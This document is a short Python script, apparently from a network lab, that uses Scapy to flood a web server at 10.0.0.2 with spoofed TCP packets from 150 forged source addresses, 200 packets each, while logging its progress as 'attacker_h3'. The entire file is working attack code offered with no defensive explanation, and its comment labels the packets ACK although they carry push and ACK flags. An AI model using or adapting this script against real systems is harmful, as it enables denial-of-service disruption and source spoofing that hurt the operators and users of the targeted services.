#!/usr/bin/env python3
from scapy.all import IP, TCP, Raw, send
import time, random, logging

# ——— set up logging
LOG_FILE = "/tmp/attacker_h3.log"
logging.basicConfig(filename=LOG_FILE,
                    level=logging.INFO,
                    format="%(asctime)s %(message)s")
log = logging.getLogger("attacker_h3")

target_ip = "10.0.0.2"
dport = 80
spoofed_base = "10.0.1."
ip_range = list(range(100, 250))
packets_per_ip = 200  # repeat each to amplify false‐positive impact
payload = Raw(load="X" * 1400)

log.info("Starting spoofed TCP ACK flood")

for spoofed_ip_suffix in ip_range:
    src_ip = spoofed_base + str(spoofed_ip_suffix)
    src_port = random.randint(1024, 65535)
    log.info("Batch src_ip=%s src_port=%d", src_ip, src_port)
    for _ in range(packets_per_ip):
        pkt = IP(src=src_ip, dst=target_ip)/TCP(
            sport=src_port, dport=dport, flags="PA"
        )/payload
        send(pkt, verbose=False)
        # stamp each packet
        log.debug("Sent spoofed ACK %s:%d → %s:%d",
                  src_ip, src_port, target_ip, dport)
        time.sleep(0.01)
    time.sleep(1)

log.info("Attack finished")
